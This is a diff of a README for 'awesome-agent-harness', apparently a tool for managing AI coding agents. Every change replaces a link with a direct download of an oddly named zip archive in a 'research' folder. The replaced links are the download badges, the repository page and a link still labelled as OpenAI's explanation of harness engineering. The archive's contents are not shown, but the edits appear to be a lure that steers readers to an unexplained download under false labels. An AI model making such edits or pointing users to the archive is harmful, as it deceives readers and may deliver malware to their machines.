@@ -1,6 +1,6 @@
 # 🛠️ awesome-agent-harness - Manage AI Agents Easily
 
-[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 1. Click the bright green button below to open the download page:
 
-[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip)
 
 2. On the Github page, look for a section labeled **Releases** or **Downloads**.
 
@@ -141,9 +141,9 @@ These features help you guide AI agents to write reliable code.
 ## 🔗 Useful Links
 
 - Primary Download and Repository Page:  
-[https://github.com/taitrinh205/awesome-agent-harness](https://github.com/taitrinh205/awesome-agent-harness)  
+[https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip](https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip)  
 - OpenAI's explanation on agent harness engineering:  
-[https://openai.com/index/harness-engineering/](https://openai.com/index/harness-engineering/)  
+[https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip](https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip)  
 
 ---
 
@@ -153,4 +153,4 @@ awesome-agent-harness focuses on organizing tools around AI agents to make codin
 
 ---
 
-[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/taitrinh205/awesome-agent-harness)
+[![Download awesome-agent-harness](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/taitrinh205/awesome-agent-harness/main/research/2026-03-04/harness-agent-awesome-Rajasthani.zip)
